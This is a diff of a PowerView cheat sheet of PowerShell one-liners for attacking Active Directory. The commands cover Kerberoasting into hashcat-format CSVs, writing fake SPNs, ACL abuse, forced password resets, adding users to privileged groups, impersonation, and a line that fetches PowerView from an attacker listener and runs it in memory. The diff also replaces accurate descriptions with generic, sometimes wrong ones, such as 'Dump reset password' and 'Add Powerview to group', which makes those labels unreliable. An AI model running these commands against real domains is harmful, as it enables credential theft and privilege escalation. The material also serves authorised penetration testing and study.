@@ -4,54 +4,54 @@
 
 ### AdminCount users
 
-Users with `adminCount=1`. Marks accounts protected by AdminSDHolder, i.e. (formerly) privileged.
+Enumerate AdminCount users with Powerview.
 
-```sh title:"AdminSDHolder-protected users (adminCount=1)"
+```sh title:"Powerview Enumerate AdminCount Users"
 Get-DomainUser * -AdminCount | select samaccountname,useraccountcontrol
 ```
 <!-- cheat -->
 
 ### Unconstrained delegation users
 
-Users with the TRUSTED_FOR_DELEGATION UAC bit. Compromise often equals domain compromise.
+Enumerate unconstrained delegation users with Powerview.
 
-```sh title:"TRUSTED_FOR_DELEGATION users (UAC bit 524288)"
+```sh title:"Powerview Enumerate Unconstrained Delegation Users"
 Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
 ```
 <!-- cheat -->
 
 ### Constrained delegation users
 
-Users marked TrustedToAuth, i.e. configured for constrained delegation with protocol transition (S4U2Self/Proxy).
+Enumerate constrained delegation users with Powerview.
 
-```sh title:"TrustedToAuth users for S4U2Self / S4U2Proxy abuse"
+```sh title:"Powerview Enumerate Constrained Delegation Users"
 Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof
 ```
 <!-- cheat -->
 
 ### ASREPRoast candidates
 
-Users with KerberosPreauthNotRequired set. AS-REP can be requested without creds and cracked offline.
+Enumerate ASREPRoast candidates with Powerview.
 
-```sh title:"KerberosPreauthNotRequired users (ASREPRoast targets)"
+```sh title:"Powerview Enumerate ASREPRoast Candidates"
 Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof
 ```
 <!-- cheat -->
 
 ### Unconstrained delegation computers
 
-Computer accounts with TRUSTED_FOR_DELEGATION. Coerce + dump LSASS for any TGT that ever lands on them.
+Enumerate unconstrained delegation computers with Powerview.
 
-```sh title:"Computers with unconstrained delegation, coerce candidates"
+```sh title:"Powerview Enumerate Unconstrained Delegation Computers"
 Get-DomainComputer -Unconstrained
 ```
 <!-- cheat -->
 
 ### ACLs by SID
 
-Filter resolved ACLs to only those granted to a specific SID. Used after Convert-NameToSid to find what your principal can write.
+Enumerate ACLs by SID with Powerview.
 
-```sh title:"Filter ACLs to entries granted to a specific SID"
+```sh title:"Powerview Enumerate ACLs by SID"
 Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
 ```
 <!-- cheat
@@ -60,9 +60,9 @@ var sid
 
 ### Object ACL
 
-Read the DACL of one named object. Direct way to see who controls it.
+Read object ACL with Powerview.
 
-```sh title:"Read DACL of one named object directly"
+```sh title:"Powerview Read Object ACL"
 Get-DomainObjectAcl -Identity $user
 ```
 <!-- cheat
@@ -71,9 +71,9 @@ var user
 
 ### Constrained delegation computers
 
-Computer accounts with TrustedToAuth (S4U2Self/Proxy). Often a privesc shortcut to any service hosted on them.
+Enumerate constrained delegation computers with Powerview.
 
-```sh title:"Computers with TrustedToAuth, S4U privesc candidates"
+```sh title:"Powerview Enumerate Constrained Delegation Computers"
 Get-DomainComputer -TrustedToAuth
 ```
 <!-- cheat -->
@@ -82,36 +82,36 @@ Get-DomainComputer -TrustedToAuth
 
 ### CSV export
 
-Thread-safe CSV append helper from PowerView. Handy when piping cmdlet output across runspaces.
+Read CSV export with Powerview.
 
-```sh title:"Thread-safe CSV append helper across runspaces"
+```sh title:"Powerview Read CSV Export"
 Export-PowerViewCSV
 ```
 <!-- cheat -->
 
 ### Resolve hostname
 
-Resolve a hostname to an IP using PowerView's helper.
+Run resolve hostname with Powerview.
 
-```sh title:"Resolve hostname to IP via PowerView helper"
+```sh title:"Powerview Run Resolve Hostname"
 Resolve-IPAddress
 ```
 <!-- cheat -->
 
 ### Convert name to SID
 
-Convert a user/group name to a SID for ACL filtering and ticketer.
+Convert name to SID with Powerview.
 
-```sh title:"Convert user/group name to SID for ACL / ticketer"
+```sh title:"Powerview Convert Name to SID"
 ConvertTo-SID
 ```
 <!-- cheat -->
 
 ### Convert name to SID (var)
 
-Concrete one-liner that stores the SID into `$sid` for follow-on ACL queries.
+Convert name to SID (var) with Powerview.
 
-```sh title:"Resolve target SID into $sid for follow-on ACL queries"
+```sh title:"Powerview Convert Name to SID (var)"
 $sid = Convert-NameToSid $target_user
 ```
 <!-- cheat
@@ -120,81 +120,81 @@ var target_user
 
 ### Convert AD name format
 
-Convert object names between sAMAccountName, UPN, DN, NT4, etc. Useful for switching identifier styles between tools.
+Convert AD name format with Powerview.
 
-```sh title:"Convert between sAMAccountName / UPN / DN / NT4"
+```sh title:"Powerview Convert AD Name Format"
 Convert-ADName
 ```
 <!-- cheat -->
 
 ### Decode UAC value
 
-Decode a userAccountControl integer into the named flags.
+Decode UAC value with Powerview.
 
-```sh title:"Decode UAC integer into named flag list"
+```sh title:"Powerview Decode UAC Value"
 ConvertFrom-UACValue
 ```
 <!-- cheat -->
 
 ### Add remote connection
 
-Mount a remote path with a supplied PSCredential. Lets cmdlets reach a host you don't have implicit creds for.
+Add remote connection with Powerview.
 
-```sh title:"Mount remote path with supplied PSCredential"
+```sh title:"Powerview Add Remote Connection"
 Add-RemoteConnection
 ```
 <!-- cheat -->
 
 ### Remove remote connection
 
-Drop a connection created by Add-RemoteConnection. Always pair the two so you don't leak mounted drives.
+Remove remote connection with Powerview.
 
-```sh title:"Drop a previously added remote connection"
+```sh title:"Powerview Remove Remote Connection"
 Remove-RemoteConnection
 ```
 <!-- cheat -->
 
 ### Impersonate user
 
-Spawn a `runas /netonly`-style logon and impersonate the resulting token. Pass-the-hash-friendly user impersonation.
+Execute impersonate user with Powerview.
 
-```sh title:"runas /netonly impersonation, PtH-friendly"
+```sh title:"Powerview Execute Impersonate User"
 Invoke-UserImpersonation
 ```
 <!-- cheat -->
 
 ### Revert impersonation
 
-Drop the impersonated token. Always pair with Invoke-UserImpersonation.
+Run revert impersonation with Powerview.
 
-```sh title:"Drop impersonation token, pair with Invoke-UserImpersonation"
+```sh title:"Powerview Run Revert Impersonation"
 Invoke-RevertToSelf
 ```
 <!-- cheat -->
 
 ### Request SPN ticket
 
-Request a Kerberos service ticket for one SPN. Stepping stone to manual Kerberoasting.
+Run request SPN ticket with Powerview.
 
-```sh title:"Request TGS for one SPN, manual Kerberoast step"
+```sh title:"Powerview Run Request SPN Ticket"
 Get-DomainSPNTicket
 ```
 <!-- cheat -->
 
 ### Invoke-Kerberoast
 
-Auto Kerberoast every reachable SPN-enabled account and return crackable hashes.
+Run invoke kerberoast with Powerview.
 
-```sh title:"Auto-Kerberoast every reachable SPN account"
+```sh title:"Powerview Run Invoke Kerberoast"
 Invoke-Kerberoast
 ```
 <!-- cheat -->
 
 ### Path ACLs
 
-Read filesystem ACLs on a path with optional group recursion. Useful for finding writable paths via group nesting.
+Run path ACLs with Powerview.
 
-```sh title:"Filesystem ACLs with group recursion expand"
+```sh title:"Powerview Run Path ACLs"
 Get-PathAcl
 ```
 <!-- cheat -->
@@ -203,90 +203,90 @@ Get-PathAcl
 
 ### DNS zones
 
-List ADIDNS zones in the domain.
+List DNS zones with Powerview.
 
-```sh title:"List ADIDNS zones in the domain"
+```sh title:"Powerview List DNS Zones"
 Get-DomainDNSZone
 ```
 <!-- cheat -->
 
 ### DNS records
 
-List DNS records in a given ADIDNS zone.
+List DNS records with Powerview.
 
-```sh title:"List DNS records in given ADIDNS zone"
+```sh title:"Powerview List DNS Records"
 Get-DomainDNSRecord
 ```
 <!-- cheat -->
 
 ### Domain
 
-Return the domain for the current (or specified) domain.
+Run domain with Powerview.
 
-```sh title:"Domain for current/specified domain"
+```sh title:"Powerview Run Domain"
 Get-Domain
 ```
 <!-- cheat -->
 
 ### Domain controllers
 
-Return the DCs for the current (or specified) domain.
+Run domain controllers with Powerview.
 
-```sh title:"Domain Controllers for current/specified domain"
+```sh title:"Powerview Run Domain Controllers"
 Get-DomainController
 ```
 <!-- cheat -->
 
 ### Forest object
 
-Return the forest object for the current forest.
+Run forest object with Powerview.
 
-```sh title:"Forest object for current/specified forest"
+```sh title:"Powerview Run Forest Object"
 Get-Forest
 ```
 <!-- cheat -->
 
 ### Forest domains
 
-Return all domains within the current forest.
+Run forest domains with Powerview.
 
-```sh title:"All domains within current forest"
+```sh title:"Powerview Run Forest Domains"
 Get-ForestDomain
 ```
 <!-- cheat -->
 
 ### Global catalogs
 
-Return all global catalog servers in the forest.
+Read global catalogs with Powerview.
 
-```sh title:"All global catalog servers in the forest"
+```sh title:"Powerview Read Global Catalogs"
 Get-ForestGlobalCatalog
 ```
 <!-- cheat -->
 
 ### Outlier objects
 
-Find users/groups/computers with attribute values that deviate from the population (anomaly detection).
+Find outlier objects with Powerview.
 
-```sh title:"Find AD objects with anomalous attribute values"
+```sh title:"Powerview Find Outlier Objects"
 Find-DomainObjectPropertyOutlier
 ```
 <!-- cheat -->
 
 ### Domain users
 
-Return all users (or one specific user) from the domain.
+Run domain users with Powerview.
 
-```sh title:"Return all users (or one user) from the domain"
+```sh title:"Powerview Run Domain Users"
 Get-DomainUser
 ```
 <!-- cheat -->
 
 ### TGS hashcat for user
 
-Pull a TGS for a user and format the hash for hashcat (mode 13100).
+Crack TGS hashcat for user with Powerview.
 
-```sh title:"Pull TGS and format for hashcat 13100"
+```sh title:"Powerview Crack TGS Hashcat for User"
 Get-DomainUser -Identity $user | Get-DomainSPNTicket -Format Hashcat
 ```
 <!-- cheat
@@ -295,72 +295,72 @@ var user
 
 ### List SPN holders
 
-List every user with an SPN set (Kerberoast target list).
+List SPN holders with Powerview.
 
-```sh title:"Every user with SPN set (Kerberoast list)"
+```sh title:"Powerview List SPN Holders"
 Get-DomainUser * -spn | select samaccountname
 ```
 <!-- cheat -->
 
 ### Bulk Kerberoast to CSV
 
-Roast every SPN account and dump hashcat-formatted hashes into a CSV.
+Crack bulk kerberoast to CSV with Powerview.
 
-```sh title:"Bulk Kerberoast to CSV in hashcat format"
+```sh title:"Powerview Crack Bulk Kerberoast to CSV"
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\users_tgs.csv -NoTypeInformation
 ```
 <!-- cheat -->
 
 ### New domain user
 
-Create a new domain user (assuming the appropriate write rights).
+Create domain user with Powerview.
 
-```sh title:"Create new domain user, requires write rights"
+```sh title:"Powerview Create Domain User"
 New-DomainUser
 ```
 <!-- cheat -->
 
 ### Set user password
 
-Reset a domain user's password (cmdlet form, requires reset rights).
+Set user password with Powerview.
 
-```sh title:"Reset domain user password (needs reset rights)"
+```sh title:"Powerview Set User Password"
 Set-DomainUserPassword
 ```
 <!-- cheat -->
 
 ### User logon events
 
-Enumerate 4624 / 4648 logon events for the named user. Maps where the user has authenticated.
+Run user logon events with Powerview.
 
-```sh title:"4624 / 4648 logon events for the named user"
+```sh title:"Powerview Run User Logon Events"
 Get-DomainUserEvent
 ```
 <!-- cheat -->
 
 ### Domain computers
 
-Return all (or specified) computer objects.
+Run domain computers with Powerview.
 
-```sh title:"All (or specified) computer objects"
+```sh title:"Powerview Run Domain Computers"
 Get-DomainComputer
 ```
 <!-- cheat -->
 
 ### Domain object
 
-Return all (or specified) AD objects regardless of class.
+Run domain object with Powerview.
 
-```sh title:"All (or specified) AD objects regardless of class"
+```sh title:"Powerview Run Domain Object"
 Get-DomainObject
 ```
 <!-- cheat -->
 
 ### Set SPN on user
 
-Write a fake SPN onto a user. Triggers targeted Kerberoasting; leave the SPN bogus to avoid breaking anything real.
+Set SPN on user with Powerview.
 
-```sh title:"Write fake SPN for targeted Kerberoasting"
+```sh title:"Powerview Set SPN on User"
 Set-DomainObject -Identity $user -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
 ```
 <!-- cheat
@@ -369,126 +369,126 @@ var user
 
 ### Object ACLs
 
-Read the DACL of an AD object.
+Read object ACLs with Powerview.
 
-```sh title:"Read DACL of an AD object"
+```sh title:"Powerview Read Object ACLs"
 Get-DomainObjectAcl
 ```
 <!-- cheat -->
 
 ### Add object ACL
 
-Add an ACE to an AD object's DACL (privesc setup).
+Add object ACL with Powerview.
 
-```sh title:"Add ACE to AD object DACL (privesc setup)"
+```sh title:"Powerview Add Object ACL"
 Add-DomainObjectAcl
 ```
 <!-- cheat -->
 
 ### Interesting ACLs
 
-Find ACEs in the domain granted to non-builtin principals (typical privesc paths).
+Run interesting ACLs with Powerview.
 
-```sh title:"ACEs granted to non-builtin principals (privesc paths)"
+```sh title:"Powerview Run Interesting ACLs"
 Find-InterestingDomainAcl
 ```
 <!-- cheat -->
 
 ### OUs
 
-List OUs.
+List OUs with Powerview.
 
-```sh title:"List OUs in the domain"
+```sh title:"Powerview List OUs"
 Get-DomainOU
 ```
 <!-- cheat -->
 
 ### Sites
 
-List AD sites.
+List sites with Powerview.
 
-```sh title:"List AD sites"
+```sh title:"Powerview List Sites"
 Get-DomainSite
 ```
 <!-- cheat -->
 
 ### Subnets
 
-List AD-defined subnets.
+List subnets with Powerview.
 
-```sh title:"List AD-defined subnets"
+```sh title:"Powerview List Subnets"
 Get-DomainSubnet
 ```
 <!-- cheat -->
 
 ### Domain SID
 
-Return the domain SID. Required for ticketer (silver/golden) and SID-history.
+Run domain SID with Powerview.
 
-```sh title:"Domain SID for ticketer / SID-history flows"
+```sh title:"Powerview Run Domain SID"
 Get-DomainSID
 ```
 <!-- cheat -->
 
 ### Domain groups
 
-Return all (or specified) domain groups.
+Run domain groups with Powerview.
 
-```sh title:"All (or specified) domain groups"
+```sh title:"Powerview Run Domain Groups"
 Get-DomainGroup
 ```
 <!-- cheat -->
 
 ### New group
 
-Create a new domain group (requires write rights).
+Create group with Powerview.
 
-```sh title:"Create new domain group, requires write rights"
+```sh title:"Powerview Create Group"
 New-DomainGroup
 ```
 <!-- cheat -->
 
 ### Managed groups
 
-Find security groups that have a `managedBy` set. The manager often has implicit write rights to membership.
+Write managed groups with Powerview.
 
-```sh title:"Groups with managedBy set, manager often writes membership"
+```sh title:"Powerview Write Managed Groups"
 Get-DomainManagedSecurityGroup
 ```
 <!-- cheat -->
 
 ### Group members
 
-List members of a domain group.
+List group members with Powerview.
 
-```sh title:"List members of a domain group"
+```sh title:"Powerview List Group Members"
 Get-DomainGroupMember
 ```
 <!-- cheat -->
 
 ### Add to group
 
-Add a user/group to an existing domain group.
+Add Powerview to group.
 
-```sh title:"Add principal to existing domain group"
+```sh title:"Powerview Add to Group"
 Add-DomainGroupMember
 ```
 <!-- cheat -->
 
 ### File servers
 
-Return likely file servers in the domain (based on SPNs).
+Start file servers with Powerview.
 
-```sh title:"Likely file servers identified via SPNs"
+```sh title:"Powerview Start File Servers"
 Get-DomainFileServer
 ```
 <!-- cheat -->
 
 ### DFS shares
 
-Return all fault-tolerant DFS namespaces.
+Run DFS shares with Powerview.
 
-```sh title:"All fault-tolerant DFS namespaces"
+```sh title:"Powerview Run DFS Shares"
 Get-DomainDFSShare
 ```
 <!-- cheat -->
@@ -497,45 +497,45 @@ Get-DomainDFSShare
 
 ### GPO objects
 
-Return all (or specified) GPO objects.
+Run GPO objects with Powerview.
 
-```sh title:"All (or specified) GPO objects"
+```sh title:"Powerview Run GPO Objects"
 Get-DomainGPO
 ```
 <!-- cheat -->
 
 ### GPO local groups
 
-GPOs that modify local group memberships via Restricted Groups / GPP.
+Set GPO local groups with Powerview.
 
-```sh title:"GPOs that modify local group membership via RG/GPP"
+```sh title:"Powerview Set GPO Local Groups"
 Get-DomainGPOLocalGroup
 ```
 <!-- cheat -->
 
 ### Map user to local groups
 
-For a user/group, map every machine where GPO grants them local-group membership. Quick way to find lateral movement targets.
+Run map user to local groups with Powerview.
 
-```sh title:"Machines where GPO grants user local-group membership"
+```sh title:"Powerview Run Map User to Local Groups"
 Get-DomainGPOUserLocalGroupMapping
 ```
 <!-- cheat -->
 
 ### Map computer's local groups
 
-For a computer (or GPO), map who is in its local groups via GPO correlation.
+Run map computer's local groups with Powerview.
 
-```sh title:"Local-group membership of a computer via GPO"
+```sh title:"Powerview Run Map Computer's Local Groups"
 Get-DomainGPOComputerLocalGroupMapping
 ```
 <!-- cheat -->
 
 ### Default policy
 
-Return the Default Domain or DC policy.
+Run default policy with Powerview.
 
-```sh title:"Default Domain Policy or DC Policy"
+```sh title:"Powerview Run Default Policy"
 Get-DomainPolicy
 ```
 <!-- cheat -->
@@ -544,135 +544,135 @@ Get-DomainPolicy
 
 ### Local groups
 
-Enumerate local groups on the local or remote machine.
+Enumerate local groups with Powerview.
 
-```sh title:"Local groups on local or remote machine"
+```sh title:"Powerview Enumerate Local Groups"
 Get-NetLocalGroup
 ```
 <!-- cheat -->
 
 ### Local group members
 
-Members of a specific local group on the local or remote machine.
+Enumerate local group members with Powerview.
 
-```sh title:"Members of named local group on remote machine"
+```sh title:"Powerview Enumerate Local Group Members"
 Get-NetLocalGroupMember
 ```
 <!-- cheat -->
 
 ### Net shares
 
-Open shares on the local or remote machine.
+Enumerate net shares with Powerview.
 
-```sh title:"Open shares on the local or remote machine"
+```sh title:"Powerview Enumerate Net Shares"
 Get-NetShare
 ```
 <!-- cheat -->
 
 ### Logged on users
 
-Users logged on the local or remote machine (NetWkstaUserEnum).
+Enumerate logged on users with Powerview.
 
-```sh title:"Users logged on (NetWkstaUserEnum)"
+```sh title:"Powerview Enumerate Logged on Users"
 Get-NetLoggedon
 ```
 <!-- cheat -->
 
 ### Net sessions
 
-Session info on the local or remote machine (NetSessionEnum). Maps where users are coming from.
+Show net sessions with Powerview.
 
-```sh title:"Session info (NetSessionEnum), origin tracking"
+```sh title:"Powerview Show Net Sessions"
 Get-NetSession
 ```
 <!-- cheat -->
 
 ### Reg logged on
 
-Who's logged on, derived from remote registry hive paths under HKU.
+Enumerate reg logged on with Powerview.
 
-```sh title:"Who's logged on via remote registry HKU paths"
+```sh title:"Powerview Enumerate Reg Logged on"
 Get-RegLoggedOn
 ```
 <!-- cheat -->
 
 ### RDP sessions
 
-Remote Desktop / Terminal Services sessions on the local or remote machine.
+Enumerate RDP sessions with Powerview.
 
-```sh title:"RDP / Terminal Services sessions on the host"
+```sh title:"Powerview Enumerate RDP Sessions"
 Get-NetRDPSession
 ```
 <!-- cheat -->
 
 ### Test admin access
 
-Test whether the current user has local admin on the target. Required for many post-exploitation primitives.
+Enumerate test admin access with Powerview.
 
-```sh title:"Test current user has local admin on target"
+```sh title:"Powerview Enumerate Test Admin Access"
 Test-AdminAccess
 ```
 <!-- cheat -->
 
 ### Computer site
 
-Return the AD site that the local or remote machine is in.
+Enumerate computer site with Powerview.
 
-```sh title:"AD site that local or remote machine is in"
+```sh title:"Powerview Enumerate Computer Site"
 Get-NetComputerSiteName
 ```
 <!-- cheat -->
 
 ### WPAD / proxy
 
-Read WPAD / proxy config from the registry.
+Read WPAD / proxy with Powerview.
 
-```sh title:"Read WPAD / proxy config from registry"
+```sh title:"Powerview Read WPAD / Proxy"
 Get-WMIRegProxy
 ```
 <!-- cheat -->
 
 ### Last logged-on user
 
-Return the last interactive logon recorded in the registry.
+Enumerate last logged on user with Powerview.
 
-```sh title:"Last interactive logon recorded in registry"
+```sh title:"Powerview Enumerate Last Logged on User"
 Get-WMIRegLastLoggedOn
 ```
 <!-- cheat -->
 
 ### Cached RDP connections
 
-RDP MRU history from the registry. Maps where users RDP from.
+Enumerate cached RDP connections with Powerview.
 
-```sh title:"RDP MRU registry history, maps where users RDP from"
+```sh title:"Powerview Enumerate Cached RDP Connections"
 Get-WMIRegCachedRDPConnection
 ```
 <!-- cheat -->
 
 ### Mounted drives
 
-Saved network mounted drives from the registry. Often points to file servers / shares with creds saved.
+Enumerate mounted drives with Powerview.
 
-```sh title:"Saved network drive mappings, often shares with creds"
+```sh title:"Powerview Enumerate Mounted Drives"
 Get-WMIRegMountedDrive
 ```
 <!-- cheat -->
 
 ### Process list with owners
 
-Process list with their owner SIDs via WMI.
+List process list with owners with Powerview.
 
-```sh title:"Process list with owner SIDs via WMI"
+```sh title:"Powerview List Process List with Owners"
 Get-WMIProcess
 ```
 <!-- cheat -->
 
 ### Find files
 
-Search a path for files matching name / size / age criteria.
+Find files with Powerview.
 
-```sh title:"Search path for files by name / size / age"
+```sh title:"Powerview Find Files"
 Find-InterestingFile
 ```
 <!-- cheat -->
@@ -681,63 +681,63 @@ Find-InterestingFile
 
 ### Find user logon
 
-Find domain machines where the named user is currently logged in. Hunt mode for high-value users.
+Find user logon with Powerview.
 
-```sh title:"Hunt: machines where named user is currently logged in"
+```sh title:"Powerview Find User Logon"
 Find-DomainUserLocation
 ```
 <!-- cheat -->
 
 ### Find process
 
-Find domain machines running a named process.
+Find process with Powerview.
 
-```sh title:"Domain machines running a named process"
+```sh title:"Powerview Find Process"
 Find-DomainProcess
 ```
 <!-- cheat -->
 
 ### Find user events
 
-Find logon events for named users across the domain.
+Find user events with Powerview.
 
-```sh title:"Logon events for named users across the domain"
+```sh title:"Powerview Find User Events"
 Find-DomainUserEvent
 ```
 <!-- cheat -->
 
 ### Find shares
 
-Find reachable SMB shares on domain machines.
+Find shares with Powerview.
 
-```sh title:"Reachable SMB shares on domain machines"
+```sh title:"Powerview Find Shares"
 Find-DomainShare
 ```
 <!-- cheat -->
 
 ### Find share files
 
-Search readable domain shares for files matching criteria. Pair with Find-DomainShare.
+Find share files with Powerview.
 
-```sh title:"Search readable shares for matching files"
+```sh title:"Powerview Find Share Files"
 Find-InterestingDomainShareFile
 ```
 <!-- cheat -->
 
 ### Find local admin
 
-Find machines where the current user has local admin. The lateral movement candidate list.
+Find local admin with Powerview.
 
-```sh title:"Machines where current user has local admin"
+```sh title:"Powerview Find Local Admin"
 Find-LocalAdminAccess
 ```
 <!-- cheat -->
 
 ### Domain local group members
 
-Enumerate local-group membership on domain machines for a named local group.
+Run domain local group members with Powerview.
 
-```sh title:"Local-group membership across domain machines"
+```sh title:"Powerview Run Domain Local Group Members"
 Find-DomainLocalGroupMember
 ```
 <!-- cheat -->
@@ -746,54 +746,54 @@ Find-DomainLocalGroupMember
 
 ### Domain trusts
 
-Return all domain trusts for the current or specified domain.
+Run domain trusts with Powerview.
 
-```sh title:"Domain trusts for current/specified domain"
+```sh title:"Powerview Run Domain Trusts"
 Get-DomainTrust
 ```
 <!-- cheat -->
 
 ### Forest trusts
 
-Return all forest trusts.
+Run forest trusts with Powerview.
 
-```sh title:"All forest-level trusts"
+```sh title:"Powerview Run Forest Trusts"
 Get-ForestTrust
 ```
 <!-- cheat -->
 
 ### Foreign users
 
-Users in groups outside the user's home domain. Cross-trust privesc indicator.
+Run foreign users with Powerview.
 
-```sh title:"Users in groups outside their home domain"
+```sh title:"Powerview Run Foreign Users"
 Get-DomainForeignUser
 ```
 <!-- cheat -->
 
 ### Foreign group members
 
-Groups containing members from another domain. Maps where cross-domain trust gives access.
+Run foreign group members with Powerview.
 
-```sh title:"Groups with members from a foreign domain"
+```sh title:"Powerview Run Foreign Group Members"
 Get-DomainForeignGroupMember
 ```
 <!-- cheat -->
 
 ### Trust mapping
 
-Recursive trust enumeration starting at the current domain. Builds a full trust map.
+Start trust mapping with Powerview.
 
-```sh title:"Recursive trust map starting at current domain"
+```sh title:"Powerview Start Trust Mapping"
 Get-DomainTrustMapping
 ```
 <!-- cheat -->
 
 ### Reset password
 
-Concrete password reset oneliner using a SecureString.
+Dump reset password with Powerview.
 
-```sh title:"Reset password using SecureString conversion"
+```sh title:"Powerview Dump Reset Password"
 $newpass = ConvertTo-SecureString '$target_pass' -AsPlainText -Force; Set-DomainUserPassword -Identity $target_user -AccountPassword $newpass -Verbose
 ```
 <!-- cheat
@@ -803,9 +803,9 @@ var target_pass
 
 ### Add user to group
 
-Add a user to a group (privesc finalization step after ACL writes).
+Add user to group with Powerview.
 
-```sh title:"Add user to group, finalize ACL-based privesc"
+```sh title:"Powerview Add User to Group"
 Add-DomainGroupMember -Identity $group_name -Members $user -Verbose
 ```
 <!-- cheat
@@ -815,9 +815,9 @@ var user
 
 ### Confirm membership
 
-Read membership back to confirm the add succeeded.
+Read confirm membership with Powerview.
 
-```sh title:"Read membership back to confirm add"
+```sh title:"Powerview Read Confirm Membership"
 Get-DomainGroupMember -Identity $group_name | select MemberName
 ```
 <!-- cheat
@@ -826,9 +826,9 @@ var group_name
 
 ### Clear SPNs
 
-Remove all SPNs from a user (cleanup after targeted Kerberoasting).
+Run clear SPNs with Powerview.
 
-```sh title:"Clear SPNs on user, cleanup after roast"
+```sh title:"Powerview Run Clear SPNs"
 Set-DomainObject -Identity $user -Clear serviceprincipalname -Verbose
 ```
 <!-- cheat
@@ -837,9 +837,9 @@ var user
 
 ### Remove from group
 
-Remove a user from a group (cleanup after privesc).
+Remove Powerview from group.
 
-```sh title:"Remove user from group, cleanup after privesc"
+```sh title:"Powerview Remove from Group"
 Remove-DomainGroupMember -Identity $group_name -Members $user -Verbose
 ```
 <!-- cheat
@@ -851,9 +851,9 @@ var user
 
 ### In-memory load
 
-Pull PowerView from an attacker HTTP listener and load it directly into the current PowerShell session - no disk drop.
+Start Powerview in memory load.
 
-```powershell title:"In-memory load PowerView from attacker server (no disk)"
+```powershell title:"Powerview Start in Memory Load"
 (New-Object Net.WebClient).DownloadString('$scheme://$lhost:$lport/PowerView.ps1') | IEX
 ```
 <!-- cheat
@@ -864,9 +864,9 @@ import scheme
 
 ### Build PSCredential object
 
-Build a `[PSCredential]` object for the `-Credential` parameter on any PowerView cmdlet (or any PowerShell cmdlet).
+Build PSCredential object with Powerview.
 
-```powershell title:"Build PSCredential for -Credential parameter"
+```powershell title:"Powerview Build PSCredential Object"
 $passwd = ConvertTo-SecureString '$pass' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential ('$domain\$user', $passwd)
 ```
 <!-- cheat
@@ -877,9 +877,9 @@ var pass
 
 ### Convert SID to name
 
-Translate a SID string into the matching domain principal.
+Convert SID to name with Powerview.
 
-```powershell title:"Translate SID string to domain principal"
+```powershell title:"Powerview Convert SID to Name"
 ConvertFrom-SID $sid
 ```
 <!-- cheat
@@ -888,9 +888,9 @@ var sid
 
 ### Find managed security groups
 
-Lists security groups where non-admin users have been granted Manage rights — common privesc path via group membership.
+Find managed security groups with Powerview.
 
-```powershell title:"Find non-admin-managed security groups (privesc path)"
+```powershell title:"Powerview Find Managed Security Groups"
 Find-ManagedSecurityGroups | select GroupName
 ```
 <!-- cheat -->
